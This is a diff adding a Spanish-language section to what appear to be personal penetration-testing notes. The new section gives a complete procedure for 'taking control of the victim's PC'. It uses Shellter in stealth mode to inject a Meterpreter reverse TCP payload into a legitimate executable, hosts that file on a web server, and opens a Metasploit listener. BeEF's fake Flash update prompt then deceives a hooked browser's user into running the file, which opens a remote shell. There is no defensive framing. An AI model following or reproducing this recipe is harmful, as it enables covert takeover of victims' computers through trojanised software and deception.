@@ -618,6 +618,45 @@ rmdir <nombre directorio> (Borrar directorio)
 --- Ir a la interfaz web de beef y en la sección de hooked browsers se nos mostrará la ip del equipo de la víctima
 --- La ventaja de este método es que la víctima no tiene que acceder a ningún url, mas bien el hook url se injecta en el navegador del usuario y este al navegar a cualquier url queda capturado por beef
 
+++ Tomar control sobre la pc de la víctima
+--- Usar shelter
+--- dpkg --add-architecture i386
+--- apt update && apt install wine32
+--- shellter
+--- Escojer la opción A (Auto Operation Mode)
+--- PE Target: <ruta_completa_del_programa>
+--- Enable Stealth Mode: Y
+--- Use a listed payload or custom: L
+--- Select payload by index: 1 (Meterpreter_Reverse_TCP)
+--- SET LHOST: <ip_local>
+--- SET LPORT: 8080
+--- ENTER
+--- La inyección de código ha sido completada 
+--- cp <nombre_archivo> /var/www/html (Copiar el archivo ya inyectado al servidor web apache
+--- Ir a la interfaz web de beef y seleccionar una víctima en el apartado hooked browsers
+--- Abir otra terminal en kali y configurar un listener para identificar cuando la víctima abra el archivo. Comandos a ejecutar:
+--- msfconsole
+--- use exploit/multi/handler
+--- set payload windows/meterpreter/reverse_tcp
+--- set LHOST <ip_local>
+--- set LPORT <8080>
+--- run
+--- Volver a la interfaz web de beef, seleccionar la víctima en la sección hooked browsers
+--- Ir a la sección de commands
+--- Buscar la opción fake
+--- Seleccionar la opción fake flash update
+--- En la sección de image, colocar la ip local (del kali)
+--- En la sección de custom payload url, colocar el url del archivo malicioso
+--- Presionar execute
+--- Ir a la pc de la víctima, en ella aparecerá un cuadro de actualización de flash player
+--- Dar clic en install, guardar el archivo, ejecutarlo e instalarlo
+--- Volver al kali, a la terminal del listener
+--- Nos aparecerá un mensaje indicando que 1 sesión ha sido abierta
+
+
+
+
+
 
 
 
